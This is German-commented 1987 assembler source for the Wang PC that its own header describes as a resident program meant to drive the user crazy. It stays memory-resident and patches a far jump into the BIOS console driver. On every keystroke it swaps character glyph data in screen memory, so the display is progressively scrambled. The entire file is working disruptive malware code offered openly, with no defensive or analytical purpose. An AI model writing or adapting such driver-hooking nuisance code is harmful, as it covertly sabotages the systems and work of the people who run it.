; MS-Macro-Assembler V1.1 /Wang PC
; (c) Ulrich Berntien .08.1987
;
; Resistentes COM Programm.
; Macht den Benutzer nach dem Aufruf/Installation verrückt.
; Zeichen werden ausgetauscht.
;

Code    Segment
Assume  Ds : Code, Cs : Code

        ORG 100H
        Jmp     Prog                    ;soll .COM werden

;-------------------------------------------------------------
;       neue CON - Service Proc
;-------------------------------------------------------------
SerCon  Proc Far
        PushF                           ;Register sichern
        Push    Ds
        Push    Es
        Push    Di
        Push    Si
        Push    Dx
        Push    Cx
        Push    Bx
        Push    Ax
        Mov     Ax,Cs                   ;Datensegment holen
        Mov     Ds,Ax
        Mov     Word PTR AdsD,Bx
        Mov     Word PTR AdsD+2,Es
;-------------------------------------------------------------
;       läßt Zeichen von CON durch
;-------------------------------------------------------------
        LEs     Bx,Ads2                 ;Adr der Service Proc
        Mov     Ax,Mem                  ;restaurieren
        Mov     Es:[Bx],Ax
        Mov     Ax,Mem+2
        Mov     Es:[Bx+2],Ax
        Mov     Al,Byte PTR Mem+4
        Mov     Es:[Bx+4],Al
        LEs     Bx,AdsD
        DB      9AH                     ; == Call FAR 0040:offset
AdsI:   DW      (?)                     ;alte Proc aufrufen
        DW      0040H
        LEs     Bx,AdsD
        Cmp     Byte PTR Es:[Bx+2],4    ;command: Input ?
        Je      S8                      ;  ja
        Jmp     SE                      ;  nein
S8:     LEs     Bx,DWord PTR Es:[Bx+14] ;transfer Ads
        Mov     Bl,Es:[Bx]              ;neues Zeichen
        Xor     Bh,Bh                   ;Bx = Zeichen
       Rept 5
        Sal     Bx,1                    ;Bx:= Bx * 32
       EndM
        Inc     Bx                      ;Bx:= Bx + 2
        Inc     Bx
        Mov     Dx,TTOut                ;Ausgang zu Monitorkarte
        LEs     Si,DWord PTR TTSib      ;Adresse des Statusbytes
        Mov     Di,12
        Mov     Al,Es:[Si]
        And     Al,0cH
        Or      Al,01H                  ;Signal für Karte
        Mov     Si,0f200H               ;Bildschirmspeicher
        Mov     Es,Si                   ;in Es
        Mov     Si,Counter
        Sub     Bx,Si
GL:     Out     Dx,Al                   ;Ausgeben
        Mov     Cx,Es:[Bx+Si]
        XChg    Es:[Si],Cx
        Mov     Es:[Bx+Si],Cx
        Inc     Si
        Inc     Si
        Dec     Di
        Jnz     GL
        Mov     Di,Counter
        Add     Di,32                   ;Nächstes Zeichen zum Tauschen
        Cmp     Di,( 254 * 32 ) + 2
        Jl      S11
        Mov     Di,( 33 * 32 ) + 2
S11:    Mov     Counter,Di
;-------------------------------------------------------------
;       Abfangsprung einsetzten und Beenden
;-------------------------------------------------------------
SE:     Mov     Ax,Jump                 ;Jump Far implantieren
        LEs     Bx,Ads2
        Mov     Es:[Bx],Ax
        Mov     Ax,Jump+2
        Mov     Es:[Bx+2],Ax
        Mov     Al,Byte PTR Jump+4
        Mov     Es:[Bx+4],Al
        Pop     Ax                      ;Rücksprung
        Pop     Bx
        Pop     Cx
        Pop     Dx
        Pop     Si
        Pop     Di
        Pop     Es
        Pop     Ds
        PopF
        Ret
SerCon  EndP

;-------------------------------------------------------------
;       Daten
;-------------------------------------------------------------
        EVEN
TTSIB   DW (?)                          ;Screen Information Blocks
        DW (?)
TTSta   DW (?)
TTOut   DW (?)
Counter DW ( 33 * 32 ) +2
AdsD    DD (?)                          ;Queue Pointer
Jump   = This Word
        DB 0EAH                         ;== Jmp FAR Code:SerCon
        DW Offset SerCon
SegA    DW (?)
        DB 0                            ;füllen auf 6 Bytes
Ads2    DD (?)                          ;Adresse der Service Proc
Mem     DW 3 Dup (?)                    ;Speicher für Service Proc
Last    DB (?)

;-------------------------------------------------------------
;       CON-Driver umleiten
;-------------------------------------------------------------
InCon   Proc Near
        Mov     Ax,0040H
        Mov     Es,Ax                   ;Segment des BIOS
        Xor     Bx,Bx                   ;Es:Bx := 0040:0000
I1:     Inc     Bx
        Jno     I2
        Jmp     Ende
I2:     Mov     Ax,Es:[Bx]              ;Suchen nach 'CON '
        Cmp     Ax,'OC'
        Jne     I1
        Mov     Ax,Es:[Bx+2]            ;zweites Wort vergleichen
        Cmp     Ax,' N'
        Jne     I1
        Mov     Ax,ES:[Bx-6]            ;Attribut prüfen
        And     Ax,0C003H
        XOr     Ax,0C003H
        Jnz     I1
        Mov     Word PTR Ads2+2,Es
        Mov     Di,Es:[Bx-4]            ;Ads der Enqueue Proc
        Mov     Word PTR Ads2,Di
        Mov     AdsI,Di                 ;Adr für Sprung
        Mov     Ax,Es:[Di]              ;6 Bytes retten
        Mov     Mem,Ax
        Mov     Ax,Es:[Di+2]
        Mov     Mem+2,Ax
        Mov     Al,Es:[Di+4]
        Mov     Byte PTR Mem+4,Al
        Mov     Ax,Jump                 ;Jump Far implantieren
        Mov     Es:[Di],Ax
        Mov     Ax,Jump+2
        Mov     Es:[Di+2],Ax
        Mov     Al,Byte PTR Jump+4
        Mov     Es:[Di+4],Al
        Ret
InCon   EndP

Prog    Proc Near
        Mov     Ax,Cs                   ;Datensegment stetzen
        Mov     SegA,AX
        Mov     Ds,Ax
        Mov     Al,01                   ;Zeiger zum system configuration table
        Int     88h                     ;BIOS call
        Mov     TTSIB+2,Es              ;Speichern des Segments
        Mov     Bx,Es:[Bx+0Ah]          ;Adresse des SIB
        Mov     TTSIB,Bx                ;und abspeichern
        Mov     Dh,Es:[Bx+13H]          ;High Byte von Anschluß
        Mov     Dl,10H                  ;Least Byte
        Mov     TTOut,Dx                ;Portnummer speichern
        Add     Bx,8                    ;Zeiger auf Statusbyte der Karte
        Mov     TTSta,Bx                ;abspeichern
        Call    InCon                   ;Console umleiten
Ende:   Mov     Dx,Offset Last + 2
        Int     27H                     ;terminate but stay resident
Prog    EndP

Code    EndS

Stack   Segment Word Stack              ;Stackbereich
        DB 100 Dup (?)
Stack   EndS

        End Prog
